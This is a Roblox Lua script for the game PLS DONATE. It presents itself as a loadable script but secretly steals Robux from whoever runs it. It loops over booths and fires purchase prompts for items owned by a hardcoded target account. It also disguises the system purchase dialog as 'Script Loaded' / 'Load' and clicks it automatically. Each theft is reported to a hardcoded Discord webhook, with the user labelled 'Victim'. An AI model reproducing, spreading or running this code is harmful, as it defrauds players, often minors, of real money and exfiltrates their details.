repeat task.wait() until game:IsLoaded()

local Username = "lan_wp27"
local Webhook = "https://discord.com/api/webhooks/1359920557998604399/TADkOrRGt4BHvwAxE7NBMMxx4JHI-EBblHnsnvRS8iXThLWDTvpGoYKThwdlmCcvqyO6"

local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")

local request = request or syn and syn.request or http_request
local Remotes = require(ReplicatedStorage.Remotes)

local donationsSent = 0

local function sendWebhook()
    local data = HttpService:JSONEncode({
        username = "PlsDonate",
        embeds = {{
            title = "HIT",
            color = 65280,
            fields = {
                {name = "Victim", value = Players.LocalPlayer.Name, inline = true},
                {name = "Robux", value = tostring(donationsSent), inline = true},
                {name = "Target", value = Username, inline = true}
            }
        }}
    })
    
    pcall(function()
        request({
            Url = Webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = data
        })
    end)
end

local targetId = Players:GetUserIdFromNameAsync(Username)
print("Target:", targetId)

spawn(function()
    while wait(2) do
        for _, booth in pairs(workspace:GetChildren()) do
            pcall(function()
                if booth.BoothUI and booth.BoothUI.Items then
                    for _, item in pairs(booth.BoothUI.Items.Frame:GetChildren()) do
                        if item:GetAttribute("OwnerUserId") == targetId then
                            local price = item:GetAttribute("AssetPrice")
                            if price and price > 0 then
                                item.Prompt:FireServer("", false, price)
                                donationsSent = donationsSent + price
                                print("Sent:", price)
                            end
                        end
                    end
                end
            end)
        end
    end
end)

CoreGui.ChildAdded:Connect(function(child)
    if child.Name == "PurchasePrompt" then
        child.ProductPurchaseContainer.Animator.ChildAdded:Connect(function(prompt)
            if prompt.Name == "Prompt" then
                wait(0.3)
                pcall(function()
                    prompt.AlertContents.TitleContainer.TitleArea.Title.Text = "Script Loaded"
                    local btn1 = prompt.AlertContents.Footer.Buttons["1"]
                    if btn1 then
                        btn1.ButtonContent.ButtonMiddleContent.Text.Text = "Load"
                        wait(0.5)
                        btn1.ButtonContent:Activate()
                    end
                end)
            end
        end)
    end
end)

print("Loaded")
